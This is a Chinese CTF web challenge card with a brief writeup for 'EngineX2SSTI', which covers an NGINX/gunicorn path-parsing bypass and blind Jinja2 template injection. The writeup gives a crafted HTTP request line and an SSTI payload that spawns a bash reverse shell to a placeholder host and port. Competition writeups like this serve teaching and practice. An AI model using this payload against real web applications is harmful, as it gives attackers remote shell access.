- **题目名称：** EngineX2SSTI
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** itSssm3
- **考点：**
1. NGINX配合gunicorn解析绕过
2. 无回显ssti
- **描述：** 这个nginx怎么不对劲……怎么ssti也不对劲呜呜呜呜
- **flag：** XSCTF{flag}
- **Writeup：** 

```
POST /secret	HTTP/1.1/../../hello HTTP/1.1
……
……

xscode={{lipsum.__globals__.__builtins__.__import__('os')['p''open']('bash+-c+"bash+-i+>%26+/dev/tcp/vps/port+0>%261"').read()}}
```
反弹shell之后 `cat flag` 就行了